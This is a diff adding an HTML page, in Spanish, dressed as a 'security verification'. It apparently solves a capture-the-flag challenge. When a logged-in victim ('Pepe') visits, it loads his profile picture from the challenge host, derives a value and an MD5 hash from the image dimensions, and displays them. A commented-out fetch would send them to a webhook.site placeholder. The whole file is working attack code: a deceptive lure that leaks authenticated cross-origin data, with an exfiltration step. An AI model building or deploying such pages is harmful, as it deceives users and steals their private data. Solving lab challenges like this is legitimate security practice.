@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verificación de Seguridad</title>
+</head>
+<body>
+    <h2>Verificando tu imagen de perfil...</h2>
+    <div id="result"></div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script>
+    // Cargar la imagen de perfil del usuario logueado (Pepe)
+    const img = new Image();
+    
+    img.onload = function() {
+        const width = this.naturalWidth;
+        const height = this.naturalHeight;
+        const nivel = width * height;
+        const md5 = CryptoJS.MD5(nivel.toString()).toString();
+        
+        console.log('✅ Imagen cargada:');
+        console.log('Dimensiones:', width + 'x' + height);
+        console.log('Nivel:', nivel);
+        console.log('MD5:', md5);
+        
+        // Mostrar en pantalla
+        document.getElementById('result').innerHTML = `
+            <h3>✅ Verificación completada</h3>
+            <p><strong>Dimensiones:</strong> ${width} × ${height} px</p>
+            <p><strong>Nivel:</strong> ${nivel}</p>
+            <p><strong>MD5:</strong> ${md5}</p>
+        `;
+        
+        // También podés enviar a un webhook si querés
+        // fetch('https://webhook.site/tu-id', {
+        //     method: 'POST',
+        //     body: JSON.stringify({ nivel, md5, dimensions: `${width}x${height}` })
+        // });
+    };
+    
+    img.onerror = function() {
+        console.error('❌ Error cargando la imagen');
+        document.getElementById('result').innerHTML = '<p>❌ Error cargando la imagen</p>';
+    };
+    
+    // URL de la imagen de perfil + timestamp para evitar cache
+    img.src = 'https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now();
+    </script>
+</body>
+</html>
